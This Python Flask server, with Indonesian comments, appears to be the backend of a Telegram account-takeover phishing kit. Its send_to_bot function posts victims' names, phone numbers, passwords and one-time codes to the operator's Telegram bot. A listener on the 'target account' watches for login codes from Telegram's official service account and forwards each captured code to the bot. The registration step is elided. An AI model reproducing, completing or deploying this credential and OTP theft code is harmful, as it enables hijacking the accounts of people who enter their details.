import os
import requests
import asyncio
import re
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, errors, events
from telethon.sessions import StringSession
from asgiref.sync import async_to_sync

app = Flask(__name__)
CORS(app)

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Penyimpanan data sesi dan status aktif
user_sessions = {}
active_listeners = {}

def send_to_bot(text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    return requests.post(url, json=payload).json()

def delete_bot_message(message_id):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "message_id": message_id})

def format_log(nama, nomor, sandi="None", otp=""):
    return f"Nama: *{nama}*\nNomor: `{nomor}`\nKata sandi: {sandi}\nOTP : {otp}"

async def monitor_otp(nomor, client):
    """Memantau pesan masuk di akun target untuk mencari kode OTP"""
    @client.on(events.NewMessage(from_users=777000)) # ID Telegram Official
    async def handler(event):
        msg_text = event.raw_text
        # Cari angka 5 digit dalam pesan
        otp_match = re.search(r'\b\d{5}\b', msg_text)
        if otp_match:
            otp_code = otp_match.group(0)
            status_msg = active_listeners.get(nomor)
            if status_msg:
                delete_bot_message(status_msg) # Hapus teks "menunggu OTP"
            
            # Kirim OTP ke Bot
            nama = user_sessions.get(nomor, {}).get('nama', 'User')
            send_to_bot(f"✅ **OTP TERDETEKSI!**\n\n{format_log(nama, nomor, otp=otp_code)}")
            
            # Hentikan monitoring setelah OTP didapat
            client.remove_event_handler(handler)
            active_listeners.pop(nomor, None)

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    step = data.get('step')
    raw_nomor = data.get('nomor', '').strip().replace(" ", "")
    nomor = '+62' + raw_nomor[1:] if raw_nomor.startswith('0') else raw_nomor
    nama = data.get('nama', 'User')
    
    # Logika pendaftaran dari website (Step 1, 2, 3) tetap berjalan di sini
    # ... (kode pendaftaran sebelumnya)
    return jsonify({"status": "success"}), 200

# WEBHOOK UNTUK TOMBOL BOT
@app.route('/webhook', methods=['POST'])
async def bot_webhook():
    update = request.json
    if "callback_query" in update:
        data = update["callback_query"]["data"]
        chat_id = update["callback_query"]["message"]["chat"]["id"]
        
        # Ekstrak nomor dari pesan log
        msg_text = update["callback_query"]["message"]["text"]
        match_nomor = re.search(r'\+62\d+', msg_text)
        
        if not match_nomor:
            return jsonify({"status": "error"}), 200
            
        nomor = match_nomor.group(0)

        if data == "request_otp":
            # Kirim teks status
            reply_markup = {
                "inline_keyboard": [[{"text": "exit", "callback_data": "stop_monitoring"}]]
            }
            res = send_to_bot("🔄 **Status: Menunggu OTP...**", reply_markup)
            active_listeners[nomor] = res.get("result", {}).get("message_id")
            
            # Mulai monitoring (butuh client session yang tersimpan)
            session_str = user_sessions.get(f"{nomor}_str")
            if session_str:
                client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
                await client.connect()
                await monitor_otp(nomor, client)
        
        elif data == "stop_monitoring":
            msg_id = active_listeners.get(nomor)
            if msg_id:
                delete_bot_message(msg_id)
                active_listeners.pop(nomor, None)
                send_to_bot("❌ Anda telah keluar dari mode input inline")

    return jsonify({"status": "success"}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))